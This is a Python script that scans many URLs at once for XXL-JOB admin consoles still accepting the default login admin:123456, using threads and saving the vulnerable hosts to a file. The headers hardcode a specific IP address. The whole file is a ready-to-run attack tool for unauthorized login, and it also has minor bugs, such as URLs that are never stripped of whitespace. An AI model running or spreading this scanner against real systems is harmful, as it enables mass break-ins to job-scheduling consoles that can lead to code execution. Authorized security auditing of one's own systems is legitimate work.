# author:"404_fu"
# date:2024-03-17 18:00
import argparse
import textwrap
from concurrent.futures import ThreadPoolExecutor
import time
import requests

requests.packages.urllib3.disable_warnings()


def payload(url):

#1.请求
    dic = {}
    full_url = f"{url}/login"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
                     "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Referer": "http://58.144.199.152:7005/toLogin",
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Origin": "http://58.144.199.152:7005",
                     "Connection": "close"}
    data = {"userName": "admin", "password": "123456"}
    try:
        response = requests.post(full_url, headers=headers, data=data, verify=False, allow_redirects=False,
                                 timeout=7)
        dic = response.json()
    except Exception:
        print(f"[-]{url} 请求失败")


    # 2.响应验证
    if dic.get("code") == 200 and dic.get("msg") == None:
        print(f"[+]{url} 存在默认口令 admin:123456")
        return url
    else:
        print(f"[-]{url} 不存在默认口令")


def call_back(n):
    # n是 future对象,n.result()是子线程任务函数的返回值
    # 把所有的url都追加到一个列表
    if n.result():
        res_lst.append(n.result())


def main(file, output, num):
    start_time = time.time()
    # 开启线程池
    threads_num = num #指定线程个数
    pool = ThreadPoolExecutor(threads_num)
    # 向池内提交任务
    with open(file, mode="r", encoding="u8") as f:
    # 1.打开文件读取内容
        for line in f:
            line.strip()
            pool.submit(payload, line).add_done_callback(call_back)
    pool.shutdown()
    with open(output, mode="w", encoding="u8") as f:
    # 2.结果输出
        for url in res_lst:
            f.write(f"{url}\n")
    print(f"任务结束总耗时:{time.time()-start_time} s")

if __name__ == '__main__':
    banner = """
 __   ____   ___          _  ____  ____                           _                                    _ 
 \ \ / /\ \ / / |        | |/ __ \|  _ \                         | |                                  | |
  \ V /  \ V /| |        | | |  | | |_) |_______      _____  __ _| | ___ __   __ _ ___ _____      ____| |
   > <    > < | |    _   | | |  | |  _ <______\ \ /\ / / _ \/ _` | |/ / '_ \ / _` / __/ __\ \ /\ / / _` |
  / . \  / . \| |___| |__| | |__| | |_) |      \ V  V /  __/ (_| |   <| |_) | (_| \__ \__ \\ V  V / (_| |
 /_/ \_\/_/ \_\______\____/ \____/|____/        \_/\_/ \___|\__,_|_|\_\ .__/ \__,_|___/___/ \_/\_/ \__,_|
                                                                      | |                                
                                                                      |_|                                  
                                                                                             Author：404fu                                                             
    """
    print(banner)
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="xxl-job 弱口令批量检测脚本",
                            formatter_class=argparse.RawDescriptionHelpFormatter,
                            epilog=textwrap.dedent('''example:
            python weakpass-xxljob.py -f url.txt -o res.txt -n 30
        '''))
    # 添加参数
    parser.add_argument("-f", "--file", dest="file", type=str, help="input file path")
    parser.add_argument("-o", "--output", dest="output", type=str, help="save file path", default="res.txt")
    parser.add_argument("-n", "--num", dest="num", type=int, help="thread num", default=20)
    # 把参数的值解析到对象中
    args = parser.parse_args()
    res_lst = []
    main(args.file, args.output, args.num)

